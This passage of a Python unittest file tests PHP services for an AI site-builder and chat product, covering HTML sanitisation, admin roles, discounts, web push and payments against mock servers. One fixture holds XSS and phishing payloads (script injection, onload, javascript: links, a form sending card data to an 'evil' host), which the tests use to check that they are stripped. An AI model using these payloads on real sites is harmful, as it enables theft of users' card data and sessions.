        base = os.path.dirname(os.path.abspath(__file__))
        spec = {"title": "Зерно", "tagline": "Кофе, который будит город", "theme": "DARK", "accent": "#C8743A",
                "sections": [{"kind": "hero", "title": "Зерно", "text": "Главный экран"},
                             {"kind": "about", "title": "О нас", "text": "<b>Обжариваем</b> зерно сами каждую неделю."},
                             {"kind": "menu", "title": "Меню", "items": [{"title": "Капучино", "price": "220 ₽", "text": "С пеной"}, "Флэт уайт"]},
                             {"kind": "prices", "title": "Цены", "items": []},
                             {"kind": "отзывы", "title": "Отзывы гостей", "items": [{"name": "Аня", "text": "Лучший кофе!"}]},
                             {"kind": "skills", "title": "Умеем", "items": [{"title": "Пуровер"}, {"title": "Аэропресс"}]},
                             {"kind": "contacts", "title": "Приходите", "text": "Ждём вас"},
                             {"kind": "gallery", "title": "Фото", "count": 99}],
                "contacts": {"email": "hello@example.com", "phone": "+7 900 000-00-00", "telegram": "https://t.me/zerno_cafe"}}
        bad_html = ("<!DOCTYPE html><html><head><title>TeleBot</title><meta http-equiv=\"refresh\" content=\"0;url=https://evil\">"
                    "<script>steal()</script><link rel=\"import\" href=\"x.html\"><style>body{color:red}</style></head>"
                    "<body onload=\"steal()\"><a href=\"javascript:alert(1)\">Купить</a><iframe src=\"https://evil\"></iframe>"
                    "<form action=\"https://evil/steal\"><input name=\"card\"></form>" + "<section><h2>Раздел</h2><p>Текст</p></section>" * 5 + "</body></html>")
        script = r'''<?php
require __DIR__ . '/config.php';
require __DIR__ . '/sitegen.php';
$in = json_decode(file_get_contents('php://stdin'), true);
$out = [];
$r = studio_save_spec('ann', json_encode($in['spec']), 'Сайт кофейни «Зерно» с меню. Почта zerno@mail.ru', true);
$out['spec'] = $r['spec'];
$out['html'] = sg_render(sg_load('ann'));
$out['public'] = sg_public_spec(sg_load('ann'));
$out['edit'] = studio_edit('ann', 'сделай синим');           // сайт из «текстов нейросети» правится и шаблонным редактором
$keep = sg_load('ann');
$again = $keep; $again['tagline'] = 'Новый слоган'; unset($again['seed']);
$out['re'] = studio_save_spec('ann', json_encode($again), '', false)['spec'];  // правка нейросетью: сайт тот же
$out['re_seed'] = $out['re']['seed'] === $keep['seed'];
$out['empty'] = studio_save_spec('ann', '{"sections": []}', 'x', true);
$out['save_html'] = studio_save_html('ann', $in['html'], 'бот', '');
$out['clean'] = sg_render(sg_load('ann'));
$out['state_spec'] = sg_public_spec(sg_load('ann'));
$out['edit_html'] = studio_edit('ann', 'сделай синим');
$out['tiny'] = studio_save_html('ann', '<p>hi</p>', '', '');
echo json_encode($out, JSON_UNESCAPED_UNICODE);
'''
        with tempfile.TemporaryDirectory() as site:
            shutil.copytree(os.path.join(base, "hosting", "aistudio"), site, dirs_exist_ok=True, ignore=shutil.ignore_patterns("data", "sites"))
            os.makedirs(os.path.join(site, "data"))
            os.makedirs(os.path.join(site, "sites"))
            with open(os.path.join(site, "t.php"), "w", encoding="utf-8") as fh:
                fh.write(script)
            r = subprocess.run(["php", os.path.join(site, "t.php")], input=json.dumps({"spec": spec, "html": bad_html}),
                               capture_output=True, text=True, timeout=60)
            self.assertEqual(r.returncode, 0, r.stderr)
            out = json.loads(r.stdout[r.stdout.index("{"):])
        got = out["spec"]
        kinds = [(x["kind"], x["title"]) for x in got["sections"]]
        # главный экран нейросети не дублируется, пустые «Цены» выброшены, неизвестный вид угадан по заголовку, контакты — последними
        self.assertEqual(kinds, [("about", "О нас"), ("menu", "Меню"), ("reviews", "Отзывы гостей"), ("skills", "Умеем"),
                                 ("gallery", "Фото"), ("contacts", "Приходите")])
        self.assertEqual((got["theme"], got["accent"], got["mode"]), ("dark", "#c8743a", "neuro-spec"))
        self.assertEqual(got["sections"][0]["text"], "Обжариваем зерно сами каждую неделю.")       # без тегов
        self.assertEqual(got["sections"][1]["items"][1], {"title": "Флэт уайт", "text": ""})       # строка → пункт
        self.assertEqual(got["sections"][2]["items"][0]["title"], "Аня")                          # name → title
        self.assertEqual(got["sections"][3]["tags"], ["Пуровер", "Аэропресс"])
        self.assertEqual(got["sections"][4]["count"], 12)
        # почта клиента — вместо выдуманной, выдуманный телефон-заглушка не публикуется, телеграм — без ссылки
        self.assertEqual(got["contacts"], {"email": "zerno@mail.ru", "telegram": "zerno_cafe"})
        self.assertIn("Капучино", out["html"])
        self.assertIn("mailto:zerno@mail.ru", out["html"])
        self.assertTrue("<b>Обжариваем" not in out["html"] and "Обжариваем зерно" in out["html"])
        self.assertNotIn("prompt", out["public"])
        self.assertEqual(out["edit"]["spec"]["accent"], "#1e5bff")
        self.assertEqual(out["re"]["tagline"], "Новый слоган")
        self.assertTrue(out["re_seed"])                                 # те же картинки после правки
        self.assertEqual(out["re"]["contacts"]["email"], "zerno@mail.ru")
        self.assertIn("error", out["empty"])
        # «весь код»: сервер вырезает всё опасное
        clean = out["clean"]
        for bad in ("<script", "steal()", "onload", "javascript:", "<iframe", "http-equiv", 'rel="import"', "https://evil/steal"):
            self.assertNotIn(bad, clean)
        self.assertIn("AI Studio Rteam", clean)
        self.assertIn("<style>body{color:red}</style>", clean)
        self.assertEqual(out["save_html"]["spec"]["title"], "TeleBot")
        self.assertIsNone(out["state_spec"])
        self.assertIn("нейросеть", out["edit_html"]["error"])
        self.assertIn("error", out["tiny"])

    @unittest.skipUnless(__import__("shutil").which("php"), "нет PHP")
    def test_roles_forever_discounts(self):
        """Админка: роль «Создатель», подписка навсегда, акция и промокоды — на главной, в оплате и в лимитах."""
        import hashlib
        import hmac
        import http.cookiejar
        import shutil
        import socket
        import subprocess
        import time
        import urllib.request
        base = os.path.dirname(os.path.abspath(__file__))
        with socket.socket() as sk:
            sk.bind(("127.0.0.1", 0))
            port = sk.getsockname()[1]
        key = "k" * 40
        with tempfile.TemporaryDirectory() as site:
            shutil.copytree(os.path.join(base, "hosting", "rai"), site, dirs_exist_ok=True, ignore=shutil.ignore_patterns("data"))
            url = f"http://127.0.0.1:{port}/"
            env = dict(os.environ, ADMIN_API_KEY=key, RAI_URL=url.rstrip("/"), SSO_SECRET="s" * 40)
            php = subprocess.Popen(["php", "-S", f"127.0.0.1:{port}", "-t", site], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            try:
                for _ in range(50):
                    try:
                        urllib.request.urlopen(url + "me.php", timeout=1)
                        break
                    except OSError:
                        time.sleep(0.1)
                web = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
                get = lambda path: web.open(url + path).read().decode()

                def admin(action, **data):
                    body = json.dumps(dict(action=action, nonce=os.urandom(8).hex(), admin="boss", **data)).encode()
                    t = str(int(time.time()))
                    req = urllib.request.Request(url + "admin_api.php", data=body, headers={
                        "Content-Type": "application/json", "X-Rai-Time": t,
                        "X-Rai-Signature": hmac.new(key.encode(), (t + "\n").encode() + body, hashlib.sha256).hexdigest()})
                    return json.loads(urllib.request.urlopen(req).read())

                csrf = json.loads(get("me.php"))["csrf"]
                web.open(urllib.request.Request(url + "auth.php", data=urllib.parse.urlencode(
                    {"csrf": csrf, "action": "register", "login": "boss", "password": "secret123", "name": "Босс"}).encode()))
                # роль «Создатель»: значок, полный доступ навсегда, не считается подписчиком
                r = admin("role_set", login="boss", role="creator")
                self.assertEqual((r["user"]["role"], r["user"]["plan"], r["user"]["forever"]), ("creator", "ultra", True))
                me = json.loads(get("me.php"))
                self.assertEqual(me["user"]["role"]["name"], "Создатель")
                lim = json.loads(get("limits.php"))
                self.assertEqual((lim["plan"], lim["left"]), ("ultra", None))
                self.assertIn("max", lim["models"])
                st = admin("stats")
                self.assertEqual((st["subscribers"], [u["login"] for u in st["team"]]), (0, ["boss"]))
                self.assertIn("навсегда", get("account.php"))
                self.assertFalse(admin("role_set", login="boss", role="god")["ok"])
                admin("role_set", login="boss", role="")
                self.assertEqual(json.loads(get("limits.php"))["plan"], "free")
                # подписка навсегда
                r = admin("grant", login="boss", plan="premium", days=1, forever=True)
                self.assertTrue(r["user"]["forever"])
                self.assertGreater(r["user"]["until"], time.time() + 70 * 365 * 86400)
                self.assertIn("навсегда", get("account.php"))
                # акция −20% на Премиум: главная и оплата
                self.assertFalse(admin("sale_save", percent=0)["ok"])
                self.assertTrue(admin("sale_save", percent=20, plans=["premium"], days=7, title="Осень")["ok"])
                self.assertIn("Ваш тариф", get("index.php"))
                home = urllib.request.urlopen(url + "index.php").read().decode()   # без входа
                self.assertIn("Осень: −20%", home)
                self.assertIn("ribbon sale", home)
                self.assertIn("479 ₽", home)                                   # 599 −20%
                pay = get("pay.php?plan=premium&months=1")
                self.assertIn("Оплатить 479 ₽", pay)
                self.assertIn("Оплатить 249 ₽", get("pay.php?plan=plus&months=1"))   # на «Плюс» акция не действует
                # промокоды: больше акции — применяется, меньше — нет, лимит использований
                self.assertTrue(admin("promo_save", code="rai50", percent=50, uses_max=1)["ok"])
                self.assertTrue(admin("promo_save", code="SMALL", percent=5)["ok"])
                self.assertIn("Оплатить 300 ₽", get("pay.php?plan=premium&months=1&promo=rai50"))
                self.assertIn("Оплатить 125 ₽", get("pay.php?plan=plus&months=1&promo=RAI50"))
                self.assertIn("больше, чем этот промокод", get("pay.php?plan=premium&months=1&promo=small"))
                self.assertIn("Такого промокода нет", get("pay.php?plan=premium&months=1&promo=nope"))
                d = admin("discounts_get")
                self.assertEqual(sorted(d["promos"]), ["RAI50", "SMALL"])
                self.assertEqual(d["prices"]["premium"]["month"]["price"], 479)
                admin("promo_delete", code="small")
                self.assertTrue(admin("sale_off")["ok"])
                self.assertIn("Оплатить 599 ₽", get("pay.php?plan=premium&months=1"))
                self.assertEqual(sorted(admin("discounts_get")["promos"]), ["RAI50"])
            finally:
                php.terminate()
                php.wait()

    @unittest.skipUnless(__import__("shutil").which("php"), "нет PHP")
    def test_push_notifications(self):
        """Push-уведомления: подписка устройства, рассылка из админки, уведомление админу о нарушении — расшифровка как в браузере."""
        try:
            from cryptography.hazmat.primitives import hashes, hmac as chmac, serialization
            from cryptography.hazmat.primitives.asymmetric import ec
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        except Exception:
            self.skipTest("нет cryptography")
        import base64
        import hashlib
        import hmac
        import http.cookiejar
        import http.server
        import shutil
        import socket
        import struct
        import subprocess
        import threading
        import time
        import urllib.request
        base = os.path.dirname(os.path.abspath(__file__))
        b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()
        unb64 = lambda t: base64.urlsafe_b64decode(t + "=" * (-len(t) % 4))

        def mac(key, data):
            h = chmac.HMAC(key, hashes.SHA256())
            h.update(data)
            return h.finalize()

        devices = {}   # путь на «сервере уведомлений» -> (закрытый ключ, открытый, auth)
        got = []

        class PushService(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_POST(self):
                body = self.rfile.read(int(self.headers["Content-Length"]))
                if self.path == "/gone":
                    self.send_response(410)
                    self.end_headers()
                    return
                priv, pub, auth = devices[self.path]
                salt, idlen = body[:16], body[20]
                as_pub, ct = body[21:21 + idlen], body[21 + idlen:]
                shared = priv.exchange(ec.ECDH(), ec.EllipticCurvePublicKey.from_encoded_point(ec.SECP256R1(), as_pub))
                ikm = mac(mac(auth, shared), b"WebPush: info\x00" + pub + as_pub + b"\x01")
                prk = mac(salt, ikm)
                plain = AESGCM(mac(prk, b"Content-Encoding: aes128gcm\x00\x01")[:16]).decrypt(mac(prk, b"Content-Encoding: nonce\x00\x01")[:12], ct, None)
                got.append({"path": self.path, "auth": self.headers["Authorization"], "enc": self.headers["Content-Encoding"],
                            "msg": json.loads(plain.rstrip(b"\x02").decode())})
                self.send_response(201)
                self.end_headers()

        svc = http.server.ThreadingHTTPServer(("127.0.0.1", 0), PushService)
        threading.Thread(target=svc.serve_forever, daemon=True).start()
        push_url = f"http://127.0.0.1:{svc.server_address[1]}"

        def device(path):
            priv = ec.generate_private_key(ec.SECP256R1())
            pub = priv.public_key().public_bytes(serialization.Encoding.X962, serialization.PublicFormat.UncompressedPoint)
            auth = os.urandom(16)
            devices[path] = (priv, pub, auth)
            return {"endpoint": push_url + path, "keys": {"p256dh": b64(pub), "auth": b64(auth)}}

        def free_port():
            with socket.socket() as sk:
                sk.bind(("127.0.0.1", 0))
                return sk.getsockname()[1]

        key = "k" * 40
        with tempfile.TemporaryDirectory() as site:
            shutil.copytree(os.path.join(base, "hosting", "rai"), site, dirs_exist_ok=True, ignore=shutil.ignore_patterns("data"))
            port = free_port()
            url = f"http://127.0.0.1:{port}/"
            env = dict(os.environ, ADMIN_API_KEY=key, RAI_URL=url.rstrip("/"), SSO_SECRET="s" * 40, PUSH_TEST_HTTP="1")
            php = subprocess.Popen(["php", "-S", f"127.0.0.1:{port}", "-t", site], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            try:
                for _ in range(50):
                    try:
                        urllib.request.urlopen(url + "push_api.php", timeout=1)
                        break
                    except OSError:
                        time.sleep(0.1)
                jar = http.cookiejar.CookieJar()
                web = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

                def call(path, data, headers=None, raw=False):
                    req = urllib.request.Request(url + path, data=(data if raw else json.dumps(data).encode()),
                                                 headers=dict({"Content-Type": "application/json"}, **(headers or {})))
                    try:
                        r = web.open(req)
                        return r.status, json.loads(r.read())
                    except urllib.error.HTTPError as e:
                        return e.code, json.loads(e.read() or b"{}")

                def admin(action, **data):
                    body = json.dumps(dict(action=action, nonce=os.urandom(8).hex(), admin="boss", **data)).encode()
                    t = str(int(time.time()))
                    return call("admin_api.php", body, {"X-Rai-Time": t, "X-Rai-Signature": hmac.new(key.encode(), (t + "\n").encode() + body, hashlib.sha256).hexdigest()}, raw=True)[1]

                info = json.loads(web.open(url + "push_api.php").read())
                self.assertTrue(info["ready"])
                self.assertEqual(len(unb64(info["key"])), 65)
                self.assertEqual(json.loads(web.open(url + "push_api.php").read())["key"], info["key"])   # ключ сайта один и тот же
                # пользователь регистрируется и включает уведомления
                csrf = json.loads(web.open(url + "me.php").read())["csrf"]
                web.open(urllib.request.Request(url + "auth.php", data=urllib.parse.urlencode(
                    {"csrf": csrf, "action": "register", "login": "anya", "password": "secret123", "name": "Аня"}).encode()))
                csrf = json.loads(web.open(url + "me.php").read())["csrf"]
                self.assertEqual(call("push_api.php", {"action": "subscribe", "subscription": device("/u1")})[0], 403)   # без токена
                code, r = call("push_api.php", {"action": "subscribe", "subscription": device("/u1")}, {"X-CSRF-Token": csrf})
                self.assertEqual((code, r["ok"]), (200, True))
                self.assertEqual(call("push_api.php", {"action": "subscribe", "subscription": {"endpoint": push_url + "/x", "keys": {"p256dh": "AAAA", "auth": "BBBB"}}},
                                      {"X-CSRF-Token": csrf})[0], 400)
                call("push_api.php", {"action": "subscribe", "subscription": dict(device("/u2"), endpoint=push_url + "/gone")}, {"X-CSRF-Token": csrf})
                # проверочное уведомление
                code, r = call("push_api.php", {"action": "test", "endpoint": push_url + "/u1"})
                self.assertTrue(r["ok"], r)
                self.assertEqual(got[-1]["msg"]["title"], "✅ Уведомления Rai работают")
                self.assertEqual(got[-1]["enc"], "aes128gcm")
                self.assertTrue(got[-1]["auth"].startswith("vapid t=") and ("k=" + info["key"]) in got[-1]["auth"])
                # админ: устройство по подписанной ссылке, рассылка, статистика
                back = "https://rteam.info/admin.php"
                exp = int(time.time()) + 3600
                tok = hmac.new(key.encode(), f"push-admin|{exp}|{back}".encode(), hashlib.sha256).hexdigest()
                self.assertEqual(call("push_api.php", {"action": "admin_subscribe", "subscription": device("/a1"), "exp": exp, "back": back, "t": "bad"})[0], 403)
                code, r = call("push_api.php", {"action": "admin_subscribe", "subscription": device("/a1"), "exp": exp, "back": back, "t": tok, "events": ["violations"]})
                self.assertEqual(r["events"], ["violations"])
                self.assertIn("push_admin.php", "push_admin.php")
                page = web.open(url + "push_admin.php?" + urllib.parse.urlencode({"exp": exp, "back": back, "t": tok})).read().decode()
                self.assertIn("Включить на этом устройстве", page)
                self.assertIn("Ссылка устарела", web.open(url + "push_admin.php?exp=1&back=x&t=y").read().decode())
                got.clear()
                r = admin("push_send", to="all", title="Новая функция", body="Rai знает лекарства", url="chat.html")
                self.assertTrue(r["ok"], r)
                self.assertEqual((r["sent"], r["removed"]), (1, 1))            # устройство, от которого браузер отказался, удалено
                self.assertEqual([g["path"] for g in got], ["/u1"])             # админские устройства в рассылку не попадают
                self.assertEqual(got[0]["msg"]["body"], "Rai знает лекарства")
                self.assertFalse(admin("push_send", to="login", login="nobody", title="x")["ok"])
                st = admin("push_stats")
                self.assertEqual((st["people"], st["devices"], len(st["admins"])), (1, 1, 1))
                self.assertEqual(st["log"][0]["title"], "Новая функция")
                # нарушение правил — админу на устройство
                got.clear()
                call("report.php", {"category": "наркотики", "text": "где купить"})
                for _ in range(30):
                    if got:
                        break
                    time.sleep(0.1)
                self.assertEqual(got[0]["path"], "/a1")
                self.assertIn("Нарушение правил", got[0]["msg"]["title"])
                self.assertEqual(got[0]["msg"]["url"], back + "?tab=rai_rules&f=new")
                # отключить устройство из админки
                self.assertTrue(admin("push_device_delete", id=st["admins"][0]["id"])["ok"])
                self.assertEqual(admin("push_stats")["admins"], [])
                # сервис-воркер и значок
                sw = web.open(url + "sw.php")
                self.assertIn("javascript", sw.headers["Content-Type"])
                self.assertIn("showNotification", sw.read().decode())
                self.assertEqual(web.open(url + "icon.php?s=96").read()[:8], b"\x89PNG\r\n\x1a\n")
            finally:
                php.terminate()
                php.wait()
                svc.shutdown()
                svc.server_close()

    @unittest.skipUnless(__import__("shutil").which("php"), "нет PHP")
    def test_php_servers(self):
        import http.server
        import socket
        import subprocess
        import threading
        import time
        import urllib.request
        base = os.path.dirname(os.path.abspath(__file__))
        for name in os.listdir(os.path.join(base, "hosting", "rai")):
            if name.endswith(".php"):
                r = subprocess.run(["php", "-l", os.path.join(base, "hosting", "rai", name)], capture_output=True, text=True)
                self.assertEqual(r.returncode, 0, r.stdout + r.stderr)

        def free_port():
            with socket.socket() as sk:
                sk.bind(("127.0.0.1", 0))
                return sk.getsockname()[1]
        with tempfile.TemporaryDirectory() as up, tempfile.TemporaryDirectory() as site:
            lib = os.path.join(up, "npm", "@mlc-ai", "web-llm@0.2.85", "lib")
            os.makedirs(lib)
            with open(os.path.join(lib, "index.js"), "w") as fh:
                fh.write("export const ok = 1;\n" * 1000)
            with open(os.path.join(up, "page.html"), "w", encoding="utf-8") as fh:
                fh.write("<html><head><title>Радио</title><script>var secret=1</script></head><body><nav>меню меню меню меню меню меню</nav>"
                         "<p>Радио изобрели Попов и Маркони в 1895 году.</p></body></html>")
            class Quiet(http.server.SimpleHTTPRequestHandler):
                def __init__(self, *a, **k):
                    super().__init__(*a, directory=up, **k)

                def log_message(self, *a):
                    pass
            upstream = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Quiet)
            threading.Thread(target=upstream.serve_forever, daemon=True).start()
            uport = upstream.server_address[1]
            for name in ("ai.php", "net.php"):
                with open(os.path.join(base, "hosting", "rai", name), encoding="utf-8") as src, open(os.path.join(site, name), "w", encoding="utf-8") as dst:
                    dst.write(src.read())
            port = free_port()
            env = dict(os.environ, AI_UPSTREAM_NPM=f"http://127.0.0.1:{uport}/npm/", AI_TEST_HTTP="1", NET_TEST_LOCAL="1")
            php = subprocess.Popen(["php", "-S", f"127.0.0.1:{port}", "-t", site], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            try:
                url = f"http://127.0.0.1:{port}/"
                for _ in range(50):
                    try:
                        urllib.request.urlopen(url + "ai.php/ping", timeout=1)
                        break
                    except OSError:
                        time.sleep(0.1)
                self.assertTrue(json.loads(urllib.request.urlopen(url + "ai.php/ping").read())["path_info"])
                first = urllib.request.urlopen(url + "ai.php/npm/@mlc-ai/web-llm@0.2.85/lib/index.js")
                self.assertEqual(first.headers["X-Rai-AI"], "fetched")
                self.assertTrue(first.read().startswith(b"export const ok"))
                second = urllib.request.urlopen(url + "ai.php/npm/@mlc-ai/web-llm@0.2.85/lib/index.js")
                self.assertEqual(second.headers["X-Rai-AI"], "stored")       # копия на своём сайте
                self.assertIn("javascript", second.headers["Content-Type"])
                for bad in ("ai.php/npm/evil@1.0/x.js", "ai.php/hf/someone/model/resolve/main/x.bin"):
                    with self.assertRaises(urllib.error.HTTPError) as err:
                        urllib.request.urlopen(url + bad)
                    self.assertEqual(err.exception.code, 403)
                page = json.loads(urllib.request.urlopen(url + "net.php?read=" + urllib.parse.quote(f"http://127.0.0.1:{uport}/page.html")).read())
                self.assertEqual(page["title"], "Радио")
                self.assertIn("Попов и Маркони", page["text"])
                self.assertNotIn("secret", page["text"])
            finally:
                php.terminate()
                php.wait()
                upstream.shutdown()
                upstream.server_close()


    @unittest.skipUnless(__import__("shutil").which("php"), "нет PHP")
    def test_subscriptions(self):
        """Главная, лимиты нейросети, оплата через Platega (поддельный сервер), API админ-панели."""
        import hashlib
        import hmac
        import http.cookiejar
        import http.server
        import shutil
        import socket
        import subprocess
        import threading
        import time
        import urllib.request
        base = os.path.dirname(os.path.abspath(__file__))
        state = {"orders": {}, "requests": []}

        class Platega(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def reply(self, code, data):
                body = json.dumps(data).encode()
                self.send_response(code)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(body)

            def do_POST(self):
                body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
                state["requests"].append((self.path, dict(self.headers), body))
                if self.headers.get("X-Secret") != "plat-secret":
                    return self.reply(401, {"message": "bad secret"})
                tid = "tx-%d" % (len(state["orders"]) + 1)
                state["orders"][tid] = {"status": "PENDING", "amount": body["paymentDetails"]["amount"]}
                self.reply(200, {"transactionId": tid, "url": "https://pay.example/" + tid, "status": "PENDING"})

            def do_GET(self):
                tid = self.path.rsplit("/", 1)[-1]
                o = state["orders"].get(tid)
                if not o:
                    return self.reply(404, {"message": "not found"})
                self.reply(200, {"id": tid, "status": o["status"], "paymentDetails": {"amount": o["amount"], "currency": "RUB"}, "paymentMethod": "SBPQR"})

        platega = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Platega)
        threading.Thread(target=platega.serve_forever, daemon=True).start()

        def free_port():
            with socket.socket() as sk:
                sk.bind(("127.0.0.1", 0))
                return sk.getsockname()[1]

        class NoRedirect(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, *a, **k):
                return None

        key = "k" * 40
        with tempfile.TemporaryDirectory() as site:
            shutil.copytree(os.path.join(base, "hosting", "rai"), site, dirs_exist_ok=True, ignore=shutil.ignore_patterns("data"))
            port = free_port()
            url = f"http://127.0.0.1:{port}/"
            env = dict(os.environ, ADMIN_API_KEY=key, PLATEGA_MERCHANT_ID="m-1", PLATEGA_SECRET="plat-secret",
                       PLATEGA_API=f"http://127.0.0.1:{platega.server_address[1]}", RAI_URL=url.rstrip("/"), SSO_SECRET="s" * 40)
            php = subprocess.Popen(["php", "-S", f"127.0.0.1:{port}", "-t", site], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            try:
                for _ in range(50):
                    try:
                        urllib.request.urlopen(url + "me.php", timeout=1)
                        break
                    except OSError:
                        time.sleep(0.1)
                jar = http.cookiejar.CookieJar()
                web = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
                raw = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar), NoRedirect)

                def get(path):
                    return web.open(url + path).read().decode()

                def post(path, data=None, headers=None, opener=None):
                    req = urllib.request.Request(url + path, data=urllib.parse.urlencode(data or {}).encode(), headers=headers or {})
                    try:
                        r = (opener or web).open(req)
                        return r.status, r.read().decode(), r.headers
                    except urllib.error.HTTPError as e:
                        return e.code, e.read().decode(), e.headers

                # главная: тарифы и цены в рублях
                home = get("index.php")
                for word in ("Тарифы", "Старт", "Плюс", "Премиум", "Ультра", "599 ₽", "pay.php?plan=premium"):
                    self.assertIn(word, home)

                # без входа — 5 сообщений нейросети в день, дальше 429
                lim = json.loads(get("limits.php"))
                self.assertTrue(lim["guest"])
                self.assertEqual((lim["limit"], lim["models"]), (5, ["fast", "normal"]))
                csrf = {"X-CSRF-Token": lim["csrf"]}
                codes = [post("limits.php", {}, csrf)[0] for _ in range(6)]
                self.assertEqual(codes, [200] * 5 + [429])
                self.assertEqual(post("limits.php", {}, {"X-CSRF-Token": "bad"})[0], 403)
                # тот же тариф — и для нейросети AI Studio: лимиты открыты только адресу студии (с cookie входа)
                for origin, allowed in (("https://aistudio.rteam.info", True), ("https://evil.example", False)):
                    r = web.open(urllib.request.Request(url + "limits.php", headers={"Origin": origin}))
                    self.assertEqual(r.headers.get("Access-Control-Allow-Origin"), origin if allowed else None)
                    self.assertEqual(r.headers.get("Access-Control-Allow-Credentials"), "true" if allowed else None)
                pre = web.open(urllib.request.Request(url + "limits.php", method="OPTIONS", headers={"Origin": "https://aistudio.rteam.info"}))
                self.assertEqual(pre.status, 204)
                self.assertIn("X-CSRF-Token", pre.headers["Access-Control-Allow-Headers"])

                # регистрация → бесплатный тариф: 15 в день, модели Лайт и Стандарт
                csrf_token = json.loads(get("me.php"))["csrf"]
                post("auth.php", {"csrf": csrf_token, "action": "register", "login": "anya", "password": "secret123", "name": "Аня"})
                lim = json.loads(get("limits.php"))
                self.assertEqual((lim["guest"], lim["plan"], lim["limit"], lim["left"]), (False, "free", 15, 15))
                self.assertEqual(lim["unlock"]["max"], "Премиум")

                # покупка «Премиум» на месяц: заказ → страница Platega
                page = get("pay.php?plan=premium&months=1")
                self.assertIn("Оплатить 599 ₽", page)
                code, _, headers = post("pay.php", {"csrf": lim["csrf"], "plan": "premium", "months": 1}, opener=raw)
                self.assertEqual(code, 302)
                self.assertTrue(headers["Location"].startswith("https://pay.example/tx-1"))
                path, sent_headers, sent = state["requests"][-1]
                self.assertEqual(path, "/v2/transaction/process")
                self.assertEqual((sent_headers["X-MerchantId"], sent["paymentDetails"]), ("m-1", {"amount": 599.0, "currency": "RUB"}))
                order_id = sent["payload"]
                self.assertEqual(sent["metadata"], {"userId": "anya"})

                # пока не оплачено — подписки нет; поддельное уведомление отклоняется
                self.assertEqual(json.loads(get("limits.php"))["plan"], "free")
                cb = json.dumps({"id": "tx-1", "amount": 599, "currency": "RUB", "status": "CONFIRMED", "paymentMethod": 2, "payload": order_id})
                def callback(secret):
                    req = urllib.request.Request(url + "pay_callback.php", data=cb.encode(), method="POST",
                                                 headers={"X-MerchantId": "m-1", "X-Secret": secret, "Content-Type": "application/json"})
                    try:
                        r = urllib.request.urlopen(req)
                        return r.status, r.read().decode()
                    except urllib.error.HTTPError as e:
                        return e.code, e.read().decode()
                self.assertEqual(callback("wrong")[0], 401)
                # уведомление пришло, но сама Platega говорит «ещё не оплачено» — не включаем
                self.assertEqual(callback("plat-secret"), (200, "OK"))
                self.assertEqual(json.loads(get("limits.php"))["plan"], "free")
                state["orders"]["tx-1"]["status"] = "CONFIRMED"
                self.assertEqual(callback("plat-secret"), (200, "OK"))
                self.assertEqual(callback("plat-secret"), (200, "OK"))  # повтор — подписка не удваивается
                lim = json.loads(get("limits.php"))
                self.assertEqual((lim["plan"], lim["limit"]), ("premium", 600))
                self.assertIn("max", lim["models"])
                self.assertAlmostEqual(lim["until"], time.time() + 30 * 86400, delta=120)
                self.assertIn("подключён", get("pay_return.php?order=" + order_id))
                self.assertIn("Ваш тариф", get("index.php"))

                # API админ-панели: только с подписью, без повторов
                def admin(action, nonce=None, sign_key=key, **data):
                    body = json.dumps(dict(action=action, nonce=nonce or os.urandom(8).hex(), admin="owner", **data))
                    t = str(int(time.time()))
                    sig = hmac.new(sign_key.encode(), (t + "\n" + body).encode(), hashlib.sha256).hexdigest()
                    req = urllib.request.Request(url + "admin_api.php", data=body.encode(), method="POST",
                                                 headers={"X-Rai-Time": t, "X-Rai-Signature": sig, "Content-Type": "application/json"})
                    try:
                        return 200, json.loads(urllib.request.urlopen(req).read())
                    except urllib.error.HTTPError as e:
                        return e.code, json.loads(e.read())
                self.assertEqual(admin("ping", sign_key="x" * 40)[0], 401)
                self.assertTrue(admin("ping")[1]["platega"])
                self.assertEqual(admin("ping", nonce="same")[0], 200)
                self.assertEqual(admin("ping", nonce="same")[0], 409)
                stats = admin("stats")[1]
                self.assertEqual((stats["users"], stats["subscribers"], stats["revenue_total"], stats["by_plan"]["premium"]), (1, 1, 599, 1))
                self.assertEqual(stats["orders"][0]["status"], "paid")
                code, res = admin("grant", login="anya", plan="ultra", days=10, note="подарок")
                self.assertTrue(res["ok"], res)
                self.assertEqual(res["user"]["plan"], "ultra")
                self.assertIsNone(json.loads(get("limits.php"))["left"])  # «Ультра» — без лимита
                self.assertFalse(admin("grant", login="nobody", plan="plus", days=5)[1]["ok"])
                self.assertEqual(admin("revoke", login="anya")[1]["user"]["plan"], "free")
                self.assertTrue(admin("plans_save", plans={"premium": {"price": 650, "neuro_day": 700}})[1]["ok"])
                self.assertIn("650 ₽", get("index.php"))
                self.assertEqual(admin("user", login="anya")[1]["user"]["plan"], "free")
                log = admin("stats")[1]["log"]
                self.assertEqual([x["type"] for x in log[:4]], ["plans", "revoke", "grant", "payment"])

                # графики, выгрузка, лимит без входа, ключи Platega, проверка заказа из админки
                stats = admin("stats")[1]
                self.assertEqual(len(stats["revenue_days"]), 30)
                self.assertEqual(sum(stats["revenue_days"].values()), 599)
                self.assertEqual(len(stats["neuro_days"]), 7)
                self.assertEqual([u["login"] for u in admin("subs_all", everyone=True)[1]["users"]], ["anya"])
                self.assertTrue(admin("plans_save", plans={"guest": {"neuro_day": 2}})[1]["ok"])
                self.assertEqual(urllib.request.urlopen(url + "limits.php").read().decode().count('"limit":2'), 1)
                self.assertEqual(admin("platega_get")[1]["source"], "config")  # ключи из config.php — из админки не меняются
